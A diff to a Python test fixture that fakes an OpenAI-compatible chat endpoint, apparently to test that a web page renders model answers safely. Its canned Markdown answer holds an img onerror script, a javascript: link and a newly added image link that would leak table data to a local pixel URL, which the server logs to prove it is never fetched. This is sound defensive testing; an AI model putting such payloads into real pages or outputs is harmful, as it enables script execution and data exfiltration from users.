@@ -1,16 +1,18 @@
 """A stand-in OpenAI-compatible chat endpoint for testing the page's turn loop without a key.
 
 Every request asks for one `list_graphs` call, unless it sets tool_choice "none", in which
-case it answers in text. GET /log returns what each request carried.
+case it answers in text. GET /log returns what each request carried, and every other GET it
+received: the closing answer's image must never be fetched.
 """
 
 import json
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 LOG: list[dict] = []
+FETCHED: list[str] = []
 
-# The closing answer exercises the page's Markdown rendering, including two injection attempts
-# that must come out inert.
+# The closing answer exercises the page's Markdown rendering, including three injection
+# attempts that must come out inert.
 MARKDOWN_ANSWER = """**44 graphs** are listed in (t1). A few, by *size*:
 
 - `babel` — 1.51 B triples
@@ -23,7 +25,9 @@ MARKDOWN_ANSWER = """**44 graphs** are listed in (t1). A few, by *size*:
 
 Not a table ref: t99. Code stays code: `t1`.
 
-<img src=x onerror="window.__pwned = 1"> [click](javascript:window.__pwned=2)"""
+<img src=x onerror="window.__pwned = 1"> [click](javascript:window.__pwned=2)
+
+![pixel](http://127.0.0.1:8766/pixel?rows=t1)"""
 
 
 class Fake(BaseHTTPRequestHandler):
@@ -49,7 +53,9 @@ class Fake(BaseHTTPRequestHandler):
         self.end_headers()
 
     def do_GET(self) -> None:
-        self.reply({"requests": LOG})
+        if self.path != "/log":
+            FETCHED.append(self.path)
+        self.reply({"requests": LOG, "fetched": FETCHED})
 
     def do_POST(self) -> None:
         body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
